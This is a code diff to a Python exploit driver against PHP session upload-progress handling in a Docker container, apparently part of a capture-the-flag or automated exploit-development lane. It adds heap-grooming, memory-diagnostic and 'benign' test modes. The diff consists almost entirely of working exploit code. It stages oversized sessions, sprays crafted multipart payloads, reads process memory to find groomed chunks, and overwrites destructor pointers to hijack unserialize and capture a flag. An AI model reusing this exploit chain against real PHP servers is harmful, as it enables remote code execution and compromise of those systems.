@@ -108,7 +108,9 @@ def dump_windows(cpid, addr, n):
 
 
 def main():
+    mode = sys.argv[1] if len(sys.argv) > 1 else "full"
     tag = sys.argv[2] if len(sys.argv) > 2 else "r1"
+    _benign = mode.startswith("benign")
     cpid = sh(["docker", "inspect", "-f", "{{.State.Pid}}", CTNR])
     bias = int(memtool("libphp-bias", cpid, "53"), 16)
     bg = bias + BG_VA
@@ -120,9 +122,41 @@ def main():
     sid_a = ("a" + ts + "a" * 32)[:32]
     sid_b = ("b" + ts + "b" * 32)[:32]
     sh(["docker", "exec", CTNR, "sh", "-c", "rm -f /tmp/sess_*"])
-    stage_big(sid_a)
-    log(f"staged producer session sess_{sid_a} (72MB) + consumer sid ready")
+    if mode != "place":
+        stage_big(sid_a)
+        log(f"staged producer session sess_{sid_a} (72MB) + consumer sid ready")
 
+    if mode == "place":
+        stage(sid_b, b"poc|i:1;")
+        import groom as g0
+        base = 0xfa2f0ea6a000
+        payload = g0.build_payload(base, bias + 0xf22000, bias)
+        comb = b"F" * 430080 + payload
+        cons = pb([part(b"g", comb),
+                   part(b"PHPSESSID", sid_b.encode()),
+                   part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
+                   part(b"u", b"y" * 10, filename=b"b.txt")])
+        s = socket.create_connection((HOST, PORT), timeout=30)
+        r, dt = send(s, post_head(len(cons)), cons, timeout=60)
+        log(f"place: t={dt:.1f}s len={len(r)} tail={r[-30:]!r}")
+        s.close()
+        time.sleep(0.3)
+        dchunk = 0xfa2f0ea6a000
+        for pid in [int(p) for p in memtool("children", cpid).split()]:
+            try:
+                hx = memtool("read", cpid, str(pid), hex(dchunk), "32")
+                b = bytes.fromhex(hx)
+                l2v = struct.unpack_from("<Q", b, 0)[0]
+                if l2v == bias + 0xf20000:
+                    log(f"place: pid={pid} GROOM AT d_chunk "
+                        f"(last={l2v:#x}) ✓✓✓")
+                else:
+                    log(f"place: pid={pid} d_chunk head={b[:16].hex()} "
+                        f"(last={l2v:#x}) - no groom")
+            except Exception as e:
+                log(f"place: pid={pid} read fail {e}")
+        return
+    s = socket.create_connection((HOST, PORT), timeout=30)
     s = socket.create_connection((HOST, PORT), timeout=30)
     prod = pb([part(b"PHPSESSID", sid_a.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
@@ -142,25 +176,69 @@ def main():
         for i in range(0, BG_LEN - 16, 8):
             v = struct.unpack_from("<Q", hx, i)[0]
             lv = struct.unpack_from("<Q", hx, i + 8)[0]
-            if b0[i:i+16] != hx[i:i+16] and lv == 1 and v > 0x1000000:
+            if (b0[i:i+16] != hx[i:i+16] and 0 < lv < 100 and
+                    v > 0x1000000):
                 hit = (pid, bg + i, v)
+                log(f"ORACLE cand: pid={pid} off={i} data={v:#x} level={lv}")
     if not hit:
-        log("ORACLE: no {data-ptr, level=1} pair found in basic_globals")
+        log("ORACLE: no {data-ptr, level!=0} pair found in basic_globals")
         raise SystemExit("oracle failed")
     cpid_child, bg_data, groom_base = hit
     log(f"ORACLE: child={cpid_child} &BG(unserialize).data={bg_data:#x} "
         f"d_chunk={groom_base:#x}")
 
+    if mode == "diag":
+        chunk = groom_base & ~0x1FFFFF
+        hx = memtool("read", cpid, str(cpid_child), hex(chunk), "4096")
+        bts = bytes.fromhex(hx)
+        import struct as st
+        map_off = None
+        for off in range(0, 4000, 4):
+            if st.unpack_from("<I", bts, off)[0] == 0x40000001:
+                map_off = off
+                break
+        log(f"DIAG: chunk={chunk:#x} map_off={map_off}")
+        dbytes = memtool("read", cpid, str(cpid_child), hex(groom_base), "128")
+        log("DIAG: d_chunk head: " + dbytes[:128])
+        if map_off:
+            fmap = bts[map_off-64:map_off]
+            runs = []
+            cur = None
+            for pg in range(512):
+                free = not (fmap[pg//8] >> (pg % 8)) & 1
+                if free and cur is None:
+                    cur = pg
+                if (not free or pg == 511) and cur is not None:
+                    end = pg if not free else 512
+                    runs.append((cur, end - cur))
+                    cur = None
+            log(f"DIAG: free runs (page,len): {runs}")
+            pg0 = (groom_base & 0x1FFFFF) >> 12
+            cands = [(s, l) for s, l in runs if l >= 3]
+            log(f"DIAG: d run page={pg0} free={any(s <= pg0 < s+l for s,l in runs)}")
+            log(f"DIAG: 3-page best-fit candidates: {cands[:8]} "
+                f"-> smallest: {min(cands, key=lambda x: x[1]) if cands else None}")
+        return
     import groom as g
     payload = g.build_payload(groom_base, bg_data, bias)
     assert len(payload) == 8192
     log(f"groom payload built: 8192B, LG={groom_base+4096:#x}")
-    stage(sid_b, b'poc|O:9:"Exception":0:{}')
+    stage(sid_b, b"poc|i:1;" if _benign else b'poc|O:9:"Exception":0:{}')
     log(f"staged consumer session sess_{sid_b}: poc|O:9:Exception:0:{{}}")
 
-    cons = pb([part(b"PHPSESSID", sid_b.encode()),
+    if _benign:
+        # safe dtor pointers into zeroed bss, no magic token
+        import groom as g0
+        payload = bytearray(payload)
+        ld = bias + 0xf22000
+        struct.pack_into("<Q", payload, 8, ld)     # first_dtor
+        struct.pack_into("<Q", payload, 16, ld)    # last_dtor
+        payload = bytes(payload)
+        log(f"benign mode: dtor ptrs -> {ld:#x}, token poc|i:1;")
+    comb = b"F" * 430080 + payload
+    cons = pb([part(b"g", comb),
+               part(b"PHPSESSID", sid_b.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
-               part(b"g", payload),
                part(b"u", b"y" * 10, filename=b"b.txt")])
     r, dt = send(s, post_head(len(cons)), cons, timeout=120)
     body = r.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in r else r
@@ -168,6 +246,16 @@ def main():
     log(f"consumer: t={dt:.1f}s len={len(r)} FLAG={'YES: ' + flag.group().decode() if flag else 'no'}")
     log("consumer body: " + body[:400].decode("utf8", "replace").replace("\n", " "))
     s.close()
+    if _benign:
+        try:
+            hx = memtool("read", cpid, str(cpid_child), hex(groom_base), "256")
+            bts = bytes.fromhex(hx)
+            sig = bts[:8] == struct.pack("<Q", bias + 0xf20000)
+            log(f"benign post: d_chunk head = {bts[:16].hex()} groom_sig={sig} "
+                f"(expect {struct.pack('<Q', bias + 0xf20000).hex()})")
+        except Exception as e:
+            log(f"benign post-read failed (child crashed?): {e}")
+        return
     if flag:
         fn = f"lanes/race-618/glm4/evidence-{tag}.txt"
         with open(fn, "wb") as f:
